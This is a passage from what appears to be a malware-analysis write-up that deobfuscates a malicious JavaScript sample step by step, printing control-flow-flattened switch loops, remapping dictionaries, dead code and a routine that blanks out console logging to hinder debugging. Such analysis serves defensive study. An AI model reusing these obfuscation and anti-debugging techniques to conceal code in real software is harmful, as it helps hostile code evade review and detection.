<span class="kw1">var</span> f4 <span class="sy0">=</span> <span class="st0">'<span class="es0">\x</span>5c'</span> <span class="sy0">+</span> <span class="kw4">Math</span><span class="br0">&#91;</span><span class="st0">'random'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">&quot;toString&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x24<span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">'substr'</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x2<span class="sy0">,</span> 0x9<span class="br0">&#41;</span> <span class="sy0">+</span> c5<span class="sy0">;</span>
<span class="kw1">var</span> f7 <span class="sy0">=</span> eX<span class="br0">&#91;</span>c2<span class="br0">&#93;</span><span class="br0">&#40;</span>0x2<span class="br0">&#41;</span> <span class="sy0">+</span> f4<span class="sy0">;</span>
<span class="kw1">return</span> f7<span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>This makes the code more readable, and will allow for a quicker analysis later on.</p>
<h3>Unflattening the control flow</h3>
<p>To obscure the control flow, aside from the encrypted string array, dead code, and redundant if-statements, the control flow is flattened. The same concept is used within all occurrences in the script. At first, two variables are created. One contains a series of numbers that are separated by pipes. Using the <a href="https://www.w3schools.com/jsref/jsref_split.asp">split</a> function, an array is filled with the numbers in the given order. The next variable is used to loop through the code. For each number in the sequence, there is a piece of code present in a switch case. Using the order that is specified by the array, the code is executed in the original order. The code excerpt is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> fs <span class="sy0">=</span> <span class="st0">&quot;2|14|1|13|10|9|3|8|11|0|5|12|6|4|7&quot;</span><span class="br0">&#91;</span><span class="st0">&quot;split&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">'|'</span><span class="br0">&#41;</span><span class="sy0">,</span>
    ft <span class="sy0">=</span> 0x0<span class="sy0">;</span>
while <span class="br0">&#40;</span><span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">switch</span> <span class="br0">&#40;</span>fs<span class="br0">&#91;</span>ft<span class="sy0">++</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">case</span> <span class="st0">'0'</span><span class="sy0">:</span>
            fv<span class="br0">&#91;</span>eJ<span class="br0">&#93;</span> <span class="sy0">=</span> 0x1<span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'1'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fu <span class="sy0">=</span> 0xaef<span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'2'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fv <span class="sy0">=</span> <span class="kw1">new</span> ce<span class="br0">&#40;</span>fb<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'3'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fw <span class="sy0">=</span> <span class="st0">&quot;kF3k33%Ec6*BF1qd..dI8tFFU]0MuNGguJRpmfgeG33;g#9qlL,FF89N% Zsr*WlaKA3 J!8Eq7oEbE[f2I&lt;9B6OUtkkx?P9zge3&quot;</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'4'</span><span class="sy0">:</span>
            fv<span class="br0">&#91;</span>eL<span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'5'</span><span class="sy0">:</span>
            fv<span class="br0">&#91;</span>eB<span class="br0">&#93;</span><span class="br0">&#40;</span>fd<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'6'</span><span class="sy0">:</span>
            fv<span class="br0">&#91;</span>eK<span class="br0">&#93;</span><span class="br0">&#40;</span>fo<span class="sy0">,</span> 0x2<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'7'</span><span class="sy0">:</span>
            <span class="kw1">return</span> fe<span class="br0">&#40;</span>fo<span class="sy0">,</span> <span class="sy0">!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'8'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fx <span class="sy0">=</span> <span class="st0">'.I0nbP*mepdcjxKFmyXFFwTeYKiR[PF%P&lt;#[T%<span class="es0">\x</span>20sRu$PRZcXfW*TN?T;UHsyl$13W2hq9thbu:D80HdX^lKw,9S@N<span class="es0">\x</span>20ph;<span class="es0">\x</span>202[sb.D'</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'9'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fy <span class="sy0">=</span> 0x2af<span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'10'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fz <span class="sy0">=</span> 0x3723db<span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'11'</span><span class="sy0">:</span>
            fv<span class="br0">&#91;</span>eH<span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'12'</span><span class="sy0">:</span>
            fv<span class="br0">&#91;</span>eE<span class="br0">&#93;</span> <span class="sy0">=</span> 0x0<span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'13'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fA <span class="sy0">=</span> 0x1733b<span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
        <span class="kw1">case</span> <span class="st0">'14'</span><span class="sy0">:</span>
            <span class="kw1">var</span> fB <span class="sy0">=</span> <span class="st0">';<span class="es0">\x</span>20ImRFc[Attwgk%CuF*7Jf]geRCMS6mBQf,k<span class="es0">\x</span>20],GdBPB$B8:*^9:zn*eCS?n<span class="es0">\x</span>208:[[NcUlcTf0ZHzeyFY8BP9LLFd!h3QLz:b[jZr'</span><span class="sy0">;</span>
            <span class="kw1">continue</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">break</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Once reordered, the code becomes easier to read, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> fv <span class="sy0">=</span> <span class="kw1">new</span> ce<span class="br0">&#40;</span>fb<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">var</span> fB <span class="sy0">=</span> <span class="st0">';<span class="es0">\x</span>20ImRFc[Attwgk%CuF*7Jf]geRCMS6mBQf,k<span class="es0">\x</span>20],GdBPB$B8:*^9:zn*eCS?n<span class="es0">\x</span>208:[[NcUlcTf0ZHzeyFY8BP9LLFd!h3QLz:b[jZr'</span><span class="sy0">;</span>
<span class="kw1">var</span> fu <span class="sy0">=</span> 0xaef<span class="sy0">;</span>
<span class="kw1">var</span> fA <span class="sy0">=</span> 0x1733b<span class="sy0">;</span>
<span class="kw1">var</span> fz <span class="sy0">=</span> 0x3723db<span class="sy0">;</span>
<span class="kw1">var</span> fy <span class="sy0">=</span> 0x2af<span class="sy0">;</span>
<span class="kw1">var</span> fw <span class="sy0">=</span> <span class="st0">&quot;kF3k33%Ec6*BF1qd..dI8tFFU]0MuNGguJRpmfgeG33;g#9qlL,FF89N% Zsr*WlaKA3 J!8Eq7oEbE[f2I&lt;9B6OUtkkx?P9zge3&quot;</span><span class="sy0">;</span>
<span class="kw1">var</span> fx <span class="sy0">=</span> <span class="st0">'.I0nbP*mepdcjxKFmyXFFwTeYKiR[PF%P&lt;#[T%<span class="es0">\x</span>20sRu$PRZcXfW*TN?T;UHsyl$13W2hq9thbu:D80HdX^lKw,9S@N<span class="es0">\x</span>20ph;<span class="es0">\x</span>202[sb.D'</span><span class="sy0">;</span>
fv<span class="br0">&#91;</span>eH<span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
fv<span class="br0">&#91;</span>eJ<span class="br0">&#93;</span> <span class="sy0">=</span> 0x1<span class="sy0">;</span>
fv<span class="br0">&#91;</span>eB<span class="br0">&#93;</span><span class="br0">&#40;</span>fd<span class="br0">&#41;</span><span class="sy0">;</span>
fv<span class="br0">&#91;</span>eE<span class="br0">&#93;</span> <span class="sy0">=</span> 0x0<span class="sy0">;</span>
fv<span class="br0">&#91;</span>eK<span class="br0">&#93;</span><span class="br0">&#40;</span>fo<span class="sy0">,</span> 0x2<span class="br0">&#41;</span><span class="sy0">;</span>
fv<span class="br0">&#91;</span>eL<span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">return</span> fe<span class="br0">&#40;</span>fo<span class="sy0">,</span> <span class="sy0">!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Note the dead code that is present in the recovered code.</p>
<h3>Remapping dictionaries</h3>
<p>At the beginning of functions, a JavaScript object is made that contains fields with values. These fields, and their values, serve as key-value pairs. In the function, the values will be taken from the object to obscure the function&#8217;s purpose. An excerpt from the code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> bg <span class="sy0">=</span> <span class="br0">&#123;</span>
    <span class="st0">'CfYsK'</span><span class="sy0">:</span> <span class="kw1">function</span><span class="br0">&#40;</span>bh<span class="sy0">,</span> bi<span class="sy0">,</span> bj<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> bh<span class="br0">&#40;</span>bi<span class="sy0">,</span> bj<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span><span class="sy0">,</span>
    <span class="st0">'uBANR'</span><span class="sy0">:</span> <span class="st0">&quot;8|0|2|7|1|4|6|3|5&quot;</span><span class="sy0">,</span>
    <span class="st0">'vVong'</span><span class="sy0">:</span> <span class="st0">&quot;KT!Wd0rRAcucX*QYYufz tnIg;ORkuP1?c[op38[z?8ROFKHKLpH?dOB&lt;n,DmUDqnlm ZPP*::AsISG ^;Iwprss;@xyOXzLfbb &quot;</span><span class="sy0">,</span>
    <span class="st0">'tEaku'</span><span class="sy0">:</span> <span class="st0">&quot;g3sO31;W8 Bd h0@fwgfpIlmlIj 1BJ l2S6#gZ[TLq6f.em!J9n^W:a9;o&lt;ELSD^Qf Z9qwz?^doAeA[8;Z[n @kJeFqe2.:Yy.&quot;</span><span class="sy0">,</span>
    <span class="st0">'MwKva'</span><span class="sy0">:</span> <span class="st0">'^8LUc?w0X%xOcUKoN<span class="es0">\x</span>20@3EP,RPQ6yA#&lt;EDN.qo*dTEsue1bLG7A9<span class="es0">\x</span>20iFNAQt0Cb[dJoJw0lrDPK@,y:mWno9N%by1t<span class="es0">\x</span>20U<span class="es0">\x</span>2037NaKs<span class="es0">\x</span>20sf'</span><span class="sy0">,</span>
    <span class="st0">'OtIWa'</span><span class="sy0">:</span> <span class="kw1">function</span><span class="br0">&#40;</span>bk<span class="sy0">,</span> bl<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> bk <span class="sy0">+</span> bl<span class="sy0">;</span>
    <span class="br0">&#125;</span><span class="sy0">,</span>
    <span class="st0">'NKXnB'</span><span class="sy0">:</span> <span class="st0">'xIs.f&lt;Abe.qi&lt;c8<span class="es0">\x</span>20dAyQZ<span class="es0">\x</span>20EHMpUGgKXbX%htpP.JhQrAiDO.<span class="es0">\x</span>20,,aU2J:Bpi$KSUe,W;*f#l[a?JkQcy!t#<span class="es0">\x</span>20fR^t.wdykHgFaRljJ'</span><span class="sy0">,</span>
    <span class="st0">'mLaoo'</span><span class="sy0">:</span> <span class="st0">&quot;gwE1Txw;Q.AD[#8lnj0Gc*bKtfY:Pc!$dIMQ210!ziIYSdUrg01]x OXOkB%9U#$S]$usPz@*]Koi?peC6sW@O. SZ D#mWYG?Eg&quot;</span><span class="sy0">,</span>
    <span class="st0">'pXVox'</span><span class="sy0">:</span> <span class="st0">&quot;MsPFI&quot;</span><span class="sy0">,</span>
    <span class="st0">'YlyIl'</span><span class="sy0">:</span> <span class="st0">&quot;return (function() &quot;</span><span class="sy0">,</span>
    <span class="st0">'GyBoN'</span><span class="sy0">:</span> <span class="st0">&quot;{}.constructor(<span class="es0">\&quot;</span>return this<span class="es0">\&quot;</span>)( )&quot;</span><span class="sy0">,</span>
    <span class="st0">'FnRMt'</span><span class="sy0">:</span> <span class="kw1">function</span><span class="br0">&#40;</span>bm<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> bm<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span><span class="sy0">,</span>
    <span class="st0">'icZPL'</span><span class="sy0">:</span> <span class="kw1">function</span><span class="br0">&#40;</span>bn<span class="sy0">,</span> bo<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> bn <span class="sy0">===</span> bo<span class="sy0">;</span>
    <span class="br0">&#125;</span><span class="sy0">,</span>
    <span class="st0">'FCQwq'</span><span class="sy0">:</span> <span class="st0">&quot;JLmQv&quot;</span><span class="sy0">,</span>
    <span class="st0">'PPHdv'</span><span class="sy0">:</span> <span class="st0">&quot;vmxRb&quot;</span>
<span class="br0">&#125;</span><span class="sy0">;</span>
<span class="kw1">var</span> bp <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><span class="br0">&#125;</span><span class="sy0">;</span>
<span class="kw1">var</span> bq<span class="sy0">;</span>
<span class="kw1">try</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">&quot;pXVox&quot;</span><span class="br0">&#93;</span> <span class="sy0">===</span> bg<span class="br0">&#91;</span><span class="st0">'pXVox'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">var</span> br <span class="sy0">=</span> <span class="kw4">Function</span><span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">&quot;OtIWa&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>bg<span class="br0">&#91;</span>
            <span class="st0">&quot;YlyIl&quot;</span><span class="br0">&#93;</span> <span class="sy0">+</span> bg<span class="br0">&#91;</span><span class="st0">&quot;GyBoN&quot;</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="st0">');'</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        bq <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">&quot;FnRMt&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>br<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> bg<span class="br0">&#91;</span><span class="st0">&quot;CfYsK&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>callback<span class="sy0">,</span> <span class="kw2">null</span><span class="sy0">,</span> <span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
<span class="br0">&#125;</span> <span class="kw1">catch</span> <span class="br0">&#40;</span>bt<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    bq <span class="sy0">=</span> window<span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The if-statement compares the same field from the object, meaning the value is irrelevant as it will always be equal. A new function is then created, where the function template as defined in the <em>OtIWa</em> field is then used to add the two given parameters together. The first parameter is the value of <em>YlyIl</em> and <em>GyBoN</em>. The second value is equal to <em>);</em>. The value, once concatenated, is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">return</span> <span class="br0">&#40;</span><span class="kw1">function</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><span class="br0">&#125;</span>.<span class="me1">constructor</span><span class="br0">&#40;</span>\<span class="st0">&quot;return this<span class="es0">\&quot;</span>)( ));</span></pre></div></div></div></div></div></div></div>


<p>This code is then executed as a function by using the function template that is defined in <em>FnRMt</em>, whose return value is then stored in <em>bq</em>. The try-catch statement is written below in the cleaned form.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1">bq <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw1">function</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><span class="br0">&#125;</span>.<span class="me1">constructor</span><span class="br0">&#40;</span>\<span class="st0">&quot;return this<span class="es0">\&quot;</span>)( ));</span></pre></div></div></div></div></div></div></div>


<p>Note that the try-catch structure has also been removed from the code, as it serves no purpose during the analysis and only clutters the overview the analyst creates.</p>
<h3>Overriding default functions</h3>
<p>The excerpt below is a part of the code that is used to override several functions that are normally present in the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Console">console</a>. A commonly used technique to see the value of an variable is to print it using <em>console.log(variableName)</em>.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> bp <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span><span class="br0">&#125;</span><span class="sy0">;</span>
<span class="kw1">var</span> bq<span class="sy0">;</span>
<span class="kw1">try</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">&quot;pXVox&quot;</span><span class="br0">&#93;</span> <span class="sy0">===</span> bg<span class="br0">&#91;</span><span class="st0">'pXVox'</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">var</span> br <span class="sy0">=</span> <span class="kw4">Function</span><span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">&quot;OtIWa&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>bg<span class="br0">&#91;</span>
            <span class="st0">&quot;YlyIl&quot;</span><span class="br0">&#93;</span> <span class="sy0">+</span> bg<span class="br0">&#91;</span><span class="st0">&quot;GyBoN&quot;</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="st0">');'</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        bq <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">&quot;FnRMt&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>br<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> bg<span class="br0">&#91;</span><span class="st0">&quot;CfYsK&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>callback<span class="sy0">,</span> <span class="kw2">null</span><span class="sy0">,</span> <span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
<span class="br0">&#125;</span> <span class="kw1">catch</span> <span class="br0">&#40;</span>bt<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    bq <span class="sy0">=</span> window<span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">!</span>bq<span class="br0">&#91;</span><span class="st0">&quot;console&quot;</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    bq<span class="br0">&#91;</span><span class="st0">&quot;console&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="kw1">function</span><span class="br0">&#40;</span>bp<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">var</span> bv <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">'uBANR'</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;split&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">'|'</span><span class="br0">&#41;</span><span class="sy0">,</span>
            bw <span class="sy0">=</span> 0x0<span class="sy0">;</span>
        while <span class="br0">&#40;</span><span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            <span class="kw1">switch</span> <span class="br0">&#40;</span>bv<span class="br0">&#91;</span>bw<span class="sy0">++</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                <span class="kw1">case</span> <span class="st0">'0'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">'log'</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'1'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">&quot;info&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'2'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">&quot;warn&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'3'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">'trace'</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'4'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">&quot;error&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'5'</span><span class="sy0">:</span>
                    <span class="kw1">return</span> aX<span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'6'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">&quot;exception&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'7'</span><span class="sy0">:</span>
                    aX<span class="br0">&#91;</span><span class="st0">&quot;debug&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'8'</span><span class="sy0">:</span>
                    <span class="kw1">var</span> aX <span class="sy0">=</span> <span class="br0">&#123;</span><span class="br0">&#125;</span><span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
            <span class="br0">&#125;</span>
            <span class="kw1">break</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
    <span class="br0">&#125;</span><span class="br0">&#40;</span>bp<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">&quot;icZPL&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">'FCQwq'</span><span class="br0">&#93;</span><span class="sy0">,</span> bg<span class="br0">&#91;</span><span class="st0">&quot;PPHdv&quot;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">var</span> X <span class="sy0">=</span> 0xf2bd6<span class="sy0">;</span>
        <span class="kw1">var</span> Y <span class="sy0">=</span> 0x169e<span class="sy0">;</span>
        <span class="kw1">var</span> Z <span class="sy0">=</span> <span class="kw1">new</span> ce<span class="br0">&#40;</span>c6<span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">var</span> a0 <span class="sy0">=</span> 0xb66<span class="sy0">;</span>
        <span class="kw1">var</span> a1 <span class="sy0">=</span> 0x11c1d<span class="sy0">;</span>
        <span class="kw1">var</span> a2 <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">&quot;vVong&quot;</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="kw1">var</span> a3 <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">'tEaku'</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="kw1">var</span> a4 <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">'MwKva'</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="kw1">var</span> a5 <span class="sy0">=</span> 0x79219<span class="sy0">;</span>
        <span class="kw1">var</span> a6 <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">&quot;OtIWa&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>bg<span class="br0">&#91;</span><span class="st0">&quot;OtIWa&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">'<span class="es0">\x</span>5c'</span><span class="sy0">,</span> <span class="kw4">Math</span><span class="br0">&#91;</span><span class="st0">&quot;random&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">&quot;toString&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x24<span class="br0">&#41;</span><span class="br0">&#91;</span><span class="st0">&quot;substr&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>0x2<span class="sy0">,</span> 0x9<span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">,</span> c5<span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">var</span> a7 <span class="sy0">=</span> 0x1522<span class="sy0">;</span>
        <span class="kw1">var</span> a8 <span class="sy0">=</span> <span class="nu0">0.3686</span><span class="sy0">;</span>
        <span class="kw1">var</span> a9 <span class="sy0">=</span> Z<span class="br0">&#91;</span>c2<span class="br0">&#93;</span><span class="br0">&#40;</span>0x2<span class="br0">&#41;</span> <span class="sy0">+</span> a6<span class="sy0">;</span>
        <span class="kw1">var</span> aa <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">&quot;NKXnB&quot;</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="kw1">var</span> ab <span class="sy0">=</span> bg<span class="br0">&#91;</span><span class="st0">'mLaoo'</span><span class="br0">&#93;</span><span class="sy0">;</span>
        <span class="kw1">return</span> a9<span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
        <span class="kw1">var</span> bO <span class="sy0">=</span> <span class="st0">&quot;2|1|0|3|6|4|5&quot;</span> <span class="br0">&#91;</span><span class="st0">&quot;split&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">'|'</span><span class="br0">&#41;</span><span class="sy0">,</span>
            bP <span class="sy0">=</span> 0x0<span class="sy0">;</span>
        while <span class="br0">&#40;</span><span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            <span class="kw1">switch</span> <span class="br0">&#40;</span>bO<span class="br0">&#91;</span>bP<span class="sy0">++</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
                <span class="kw1">case</span> <span class="st0">'0'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">&quot;console&quot;</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;debug&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
